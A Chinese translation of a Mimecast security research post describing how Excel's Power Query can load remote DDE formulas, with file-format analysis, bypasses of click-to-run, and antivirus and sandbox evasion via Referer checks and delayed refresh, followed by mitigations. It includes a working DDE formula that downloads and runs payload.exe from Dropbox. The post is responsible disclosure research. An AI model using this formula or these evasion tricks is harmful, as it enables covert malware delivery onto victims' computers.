> 原文链接: https://www.anquanke.com//post/id/181206 


# 如何利用Power Query功能实现DDE攻击


                                阅读量   
                                **199406**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者mimecast，文章来源：mimecast.com
                                <br>原文地址：[https://www.mimecast.com/blog/2019/06/exploit-using-microsoft-excel-power-query-for-remote-dde-execution-discovered/](https://www.mimecast.com/blog/2019/06/exploit-using-microsoft-excel-power-query-for-remote-dde-execution-discovered/)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p2.ssl.qhimg.com/t01472fe51e4c4ead81.jpg)](https://p2.ssl.qhimg.com/t01472fe51e4c4ead81.jpg)



## 0x00 前言

Mimecast Threat Center发现并开发了一种攻击技术，可以利用Microsoft Excel中的Power Query功能动态启动针对Excel电子表格的远程DDE（Dynamic Data Exchange）攻击，主动控制利用Power Query的payload。

[Power Query](https://support.office.com/en-us/article/power-query-overview-and-learning-ed614c81-4b00-4291-bd3a-55d80767f81d)是一款强大且可扩展的BI（Business Intelligence，商业智能）工具，可以帮助用户将电子表格与其他数据源（如外部数据库、文本文档、其他电子表格或者web页面等）集成。当链接外部源时，数据可以加载并保存到电子表格中，或者采用动态加载方式（比如当文档打开时再加载）。

Mimecast Threat Center团队发现将Power Query与其他攻击方法结合起来后，可以发起较为复杂的、难以检测的攻击行为。攻击者可以使用Power Query将恶意内容嵌入独立数据源中，然后在电子表格打开时将该内容载入表格中。恶意代码可以用来释放并执行恶意软件，攻陷用户主机。

Excel的这个特性提供了非常丰富的控制功能，可以在投递其他payload之前收集沙箱或者受害者主机的指纹信息。攻击者在攻击和payload投放前可能具备一定的控制能力，可以让沙箱或其他安全解决方案无法检测该文件的情况下，将恶意payload投放到受害者主机中。

Mimecast与微软合作，遵循CVD（[Coordinated Vulnerability Disclosure](https://www.microsoft.com/en-us/msrc/cvd)，协调漏洞披露）流程来判断这是Power Query的正常行为还是需要解决的问题。微软目前拒绝发布修复补丁，决定提供一种解决办法来缓解此问题。

在本文中我们将详细分析如何利用Power Query来发起DDE攻击，通过文件共享站点来释放并执行payload。



## 0x01 利用Power Query的攻击方法

由于Power Query是Microsoft Excel中的一款强大工具，因此滥用该功能所能造成的潜在危险也不容忽视。如果成功利用，攻击者可以集合其他潜在的攻击面来发起复杂的攻击，包括本地权限提升、DDE攻击以及远程代码执行等。

Power Query功能可以帮助用户非常方便且动态地嵌入远程内容。这种攻击形式通常难以发现，使攻击者更有机会突破受害者主机。利用Power Query中的潜在脆弱性，攻击者可以嵌入任何恶意payload，并且这些payload不需要保存在文档中，可以在文档打开时从web远程下载。

为了演示如何利用Power Query来启动DDE攻击，我们可以编写一个自定义的简单HTTP服务器，在web页面上托管payload，然后将这个web页面载入电子表格中。HTTP服务器可以在本地80端口上监听，当收到来自电子表格的请求时，返回所需的DDE内容。

```
=cmd|'/c powershell -command "&amp; `{` iwr https://www.dropbox.com/s/jo94jn2s3j84mfr/payload.exe?dl=1 -OutFile payload.exe `}`";cmd /c payload.exe'!A1,
```

[![](https://p3.ssl.qhimg.com/t011f5d8f1142af0e4f.png)](https://p3.ssl.qhimg.com/t011f5d8f1142af0e4f.png)

Microsoft Excel 2016电子表格使用Power Query来查询我们构造的恶意web页面（`http://127.0.0.1:80`）。

[![](https://p5.ssl.qhimg.com/t014b038eaf72c0baef.png)](https://p5.ssl.qhimg.com/t014b038eaf72c0baef.png)

随后远程内容会被读取并载入电子表格中。

[![](https://p2.ssl.qhimg.com/t01b738f4d24faf74dd.jpg)](https://p2.ssl.qhimg.com/t01b738f4d24faf74dd.jpg)

我们可以使用Wireshark来捕捉攻击数据流。下图中高亮标记的数据包分别为包含DDE公式的数据包、对`dropbox.com`的DNS请求（`payload.exe`托管在Dropbox上）以及用来投放payload的HTTPS会话。

[![](https://p5.ssl.qhimg.com/t01e07f2766fdc9bcad.png)](https://p5.ssl.qhimg.com/t01e07f2766fdc9bcad.png)

[![](https://p3.ssl.qhimg.com/t0108c401984a441fda.png)](https://p3.ssl.qhimg.com/t0108c401984a441fda.png)



## 0x02 分析文件格式

分析文件格式后，我们可以看到`table/table1.xml`中包含`name: “localhost”`属性（默认）以及`type: “queryTable”`属性。

表格以及特定查询表格属性的链接位于`.rels`流中（`_rels/table1.xml.rels`），其中包含一个`target`字段，该字段指向的是`../queryTables/queryTable1.xml`。`quetyTable1.xml`会在`&lt;queryTable&gt;`标签下通过`connectionId`字段连接到`connection.xml`（该文件中包含所有文档连接属性）。程序会使用`Select *`命令通过`dbPr`对象发起连接。

web查询请求存放在`xl\customXL\item1`文档中，经过base64编码。

[![](https://p2.ssl.qhimg.com/t01941797f5c9634565.png)](https://p2.ssl.qhimg.com/t01941797f5c9634565.png)

base64解码后，我们打开其中的`section1`文档，其中就包含查询请求。

[![](https://p5.ssl.qhimg.com/t01d606261c8a75940c.png)](https://p5.ssl.qhimg.com/t01d606261c8a75940c.png)

为了运行DDE，用户需要双击加载DDE的单元格，然后再次点击释放。这些操作将会触发DDE，启动来自web的payload。



## 0x03 绕过双击限制实现自动化执行

为了绕过“点击运行”限制，我们发现在老版的Microsoft Office对“从Web获取外部数据”的实现与现在版本有所不同。前面提到过，我们使用Microsoft Office 2016时会创建`dbPr`，用户需要采取某些操作才能激活payload（在沙箱等场景中，这种点击操作会达到沙箱绕过效果）。

当在老版本Office（比如2010）中“从Web获取外部数据”时，在`Connections.xml`下创建的对象并不是前文提到的`dbPr`，而是`webPr`，后者会更加简单。与`dbPr`不同，`webPr`并不需要任何用户操作，就可以运行payload。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t0111e99226bfc56144.png)



## 0x04 使用Power Query绕过AV及沙箱

我们可以在web请求中添加头部字段，使payload能够绕过专门针对这类恶意内容的反病毒软件以及沙箱环境。只有请求中包含特定的HTTP头部字段时，web服务器才会提供恶意内容。反病毒产品会从文件中提取HTTP服务器的URL地址，但并不会去解析头部数据。当AV发送测试请求时，服务器知道该请求来自于AV，而非电子表格。

只有当HTTP头中的`Referer`字段值设置为`www.google.com`时，我们才会提供DDE数据。

[![](https://p3.ssl.qhimg.com/t01905e67e27675a74a.png)](https://p3.ssl.qhimg.com/t01905e67e27675a74a.png)

我们可以在Power Query的“高级”模式中设定web请求头。Power Query会使用我们设置的`Referer`字段来发起web请求。

[![](https://p4.ssl.qhimg.com/t01d774daa369eae10b.png)](https://p4.ssl.qhimg.com/t01d774daa369eae10b.png)

如果另一个程序想尝试部分模拟Power Query的行为，不使用正确的`Referer`字段请求web页面，就不能得到正确结果。只有使用Microsoft Excel应用来打开原始文档时才能获取payload数据。

[![](https://p1.ssl.qhimg.com/t0165f5798a0498d2e2.png)](https://p1.ssl.qhimg.com/t0165f5798a0498d2e2.png)

由于沙箱环境也会在请求中发送自定义头部，因此我们需要一种新的方法来避免被检测。这里我们可以使用Power Query中的“auto refresh”（自动刷新）以及“refresh”（刷新）时间间隔参数。

[![](https://p5.ssl.qhimg.com/t01408b8b05ad93f94e.png)](https://p5.ssl.qhimg.com/t01408b8b05ad93f94e.png)

为了避免文件中存在恶意内容，使该文件被标记为恶意软件，我们可以强制让文件在打开时刷新数据，然后在保存文件前移除来自外部数据源的数据。这些属性可以确保在文件打开时会更新文件中的payload。我们可以设置文件每分钟刷新一次（这是最短的时间间隔），然后在第10次请求时提供payload数据。这意味着如果沙箱运行该文件的时间少于10分钟，那么就永远拿不到我们的payload。

[![](https://p3.ssl.qhimg.com/t01b0e95ad1442a15e6.png)](https://p3.ssl.qhimg.com/t01b0e95ad1442a15e6.png)

对于我们提供的攻击样例，大多数静态分析AV都检测不出该文件（其中并不包含payload数据），而沙箱或其他安全解决方案只会一次或者两次下载web内容，因此也检测不出来。

[![](https://p5.ssl.qhimg.com/t0182c617492359c346.png)](https://p5.ssl.qhimg.com/t0182c617492359c346.png)



## 0x05 缓解措施

Mimecast Threat Center团队向MRSC（Microsoft Security Response Center）反馈了我们得到的信息以及可用的PoC。MRSC创建了一个case，但决定不修复这种行为，而是采用组策略来组织外部数据连接或者使用Office Trust中心来缓解这个问题。MRSC同意我们根据CVD策略发布此次研究成果。

微软发布了一个安全公告（[4053440](https://docs.microsoft.com/en-us/security-updates/securityadvisories/2017/4053440)），提供了为Microsoft Office应用进行安全设置的相关步骤及过程。该公告可以指导用户如何确保应用程序安全处理DDE字段。

攻击者一直都希望能够绕过受害者部署的检测机制。随着时间的推移，由于各种安全专家及信息共享平台都在分享威胁情报数据，因此这类攻击方式可能会被检测出来。Mimecast强烈建议所有Microsoft Excel客户部署微软提供的缓解方案，因为这类攻击方法可以对微软客户造成实际且有破坏性的安全风险。

[Mimecast Targeted Threat Protection](https://www.mimecast.com/products/email-security-with-targeted-threat-protection/attachment-protect/)通过高级深入解析、去混淆处理，对每个文件进行实时代码分析，可以检测并阻止这种攻击技术。
